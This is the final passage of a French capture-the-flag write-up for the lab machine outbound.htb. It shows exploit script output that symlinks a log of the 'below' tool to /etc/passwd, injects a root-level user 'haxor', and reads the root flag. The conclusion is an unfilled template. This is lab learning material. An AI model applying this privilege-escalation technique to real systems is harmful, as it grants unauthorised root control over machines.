[*] Checking sudo permissions...
[*] Backing up /etc/passwd to /tmp/passwd.bak
[*] Generating password hash...
[*] Creating malicious passwd line...
[*] Linking /var/log/below/error_root.log to /etc/passwd
[*] Triggering 'below' to write to symlinked log...
[*] Injecting malicious user into /etc/passwd
[*] Try switching to 'haxor' using password: hacked123
Password:
```

Le script se termine par un `su haxor` : il ne reste alors plus qu’à saisir le mot de passe `hacked123` pour obtenir un shell `root`.

```bash
haxor@outbound:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
```

Tu peux alors accéder au répertoire `/root` et lire le flag final :

```bash
haxor@outbound:/dev/shm# cat /root/root.txt
0b38xxxxxxxxxxxxxxxxxxxxxxxxxxxd5df
```

La machine est maintenant entièrement compromise.  
L’accès au fichier `root.txt` valide l’escalade de privilèges et termine le challenge `outbound.htb`.

## Conclusion

- Récapitulatif de la chaîne d'attaque (du scan à root).
- Vulnérabilités exploitées & combinaisons.
- Conseils de mitigation et détection.
- Points d'apprentissage personnels.

---

## Pièces jointes (optionnel)

- Scripts, one-liners, captures, notes.  
- Arbo conseillée : `files/<nom_ctf>/…`

{{< feedback >}}